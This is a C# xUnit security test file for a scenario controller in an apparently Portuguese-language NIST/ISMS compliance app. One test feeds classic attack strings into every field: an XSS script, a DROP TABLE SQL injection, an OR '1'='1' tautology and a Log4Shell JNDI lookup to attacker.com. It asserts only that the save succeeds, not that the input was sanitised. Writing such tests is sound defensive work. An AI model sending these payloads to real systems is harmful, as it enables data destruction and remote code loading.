using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.Logging;
using Moq;
using NistXGH.Controllers;
using NistXGH.Models;
using NistXGH.Models.Dto;
using NistXGH.Services;
using Xunit;

namespace NistXGH.Tests.Controllers.Security
{
    public class SecurityTests : TestBase
    {
        private readonly Mock<ILogger<CenariosController>> _mockLogger;
        private readonly Mock<IFormatacaoService> _mockFormatacaoService;
        private readonly SgsiDbContext _context;
        private readonly CenariosController _controller;

        public SecurityTests()
        {
            _context = CreateMockDbContext();
            _mockLogger = new Mock<ILogger<CenariosController>>();
            _mockFormatacaoService = new Mock<IFormatacaoService>();
            _controller = new CenariosController(
                _context,
                _mockLogger.Object,
                _mockFormatacaoService.Object
            );
        }

        [Theory]
        [InlineData(0)]
        [InlineData(-1)]
        [InlineData(int.MinValue)]
        public async Task GetCenarioAtual_ComIdsInvalidos_DeveRetornarObjetoPadrao(int idInvalido)
        {
            // Act
            var result = await _controller.GetCenarioAtual(idInvalido);

            // Assert
            var okResult = Assert.IsType<OkObjectResult>(result);
            var response = okResult.Value;
            Assert.NotNull(response);

            var subcategoriaProperty = response.GetType().GetProperty("SUBCATEGORIA");
            Assert.NotNull(subcategoriaProperty);
            Assert.Equal(idInvalido, (int)subcategoriaProperty.GetValue(response)!);

            var justificativaProperty = response.GetType().GetProperty("JUSTIFICATIVA");
            Assert.NotNull(justificativaProperty);
            Assert.Equal(
                "Registro a ser preenchido",
                (string)justificativaProperty.GetValue(response)!
            );
        }

        [Theory]
        [InlineData("<script>alert('xss')</script>")]
        [InlineData("'; DROP TABLE CENARIOS_ATUAL;--")]
        [InlineData("' OR '1'='1")]
        [InlineData("${jndi:ldap://attacker.com}")]
        public async Task SalvarCenarioAtual_ComInputsMaliciosos_DeveSanitizarOuRejeitar(
            string inputMalicioso
        )
        {
            // Arrange - 🔥 USA ID ÚNICO
            var uniqueId = GenerateTestId();
            var cenarios = new List<CenarioAtualDto>
            {
                new CenarioAtualDto
                {
                    SUBCATEGORIA = uniqueId, // 🔥 ID ÚNICO
                    JUSTIFICATIVA = inputMalicioso,
                    POLIT_ATUAL = inputMalicioso,
                    PRAT_ATUAL = inputMalicioso,
                    PRIOR_ATUAL = 1,
                    STATUS_ATUAL = 1,
                    FUNC_RESP = inputMalicioso,
                    REF_INFO = inputMalicioso,
                    EVID_ATUAL = inputMalicioso,
                    NOTAS = inputMalicioso,
                    CONSIDERACOES = inputMalicioso,
                },
            };

            // Act
            var result = await _controller.SalvarCenarioAtual(cenarios);

            // Assert
            var okResult = Assert.IsType<OkObjectResult>(result);
            var response = okResult.Value;
            Assert.NotNull(response);

            var successProperty = response.GetType().GetProperty("sucesso");
            Assert.NotNull(successProperty);
            Assert.True((bool)successProperty.GetValue(response)!);

            var cenarioSalvo = await _context.CenariosAtual.FirstOrDefaultAsync(c =>
                c.SUBCATEGORIA == uniqueId
            );
            Assert.NotNull(cenarioSalvo);
        }
    }
}
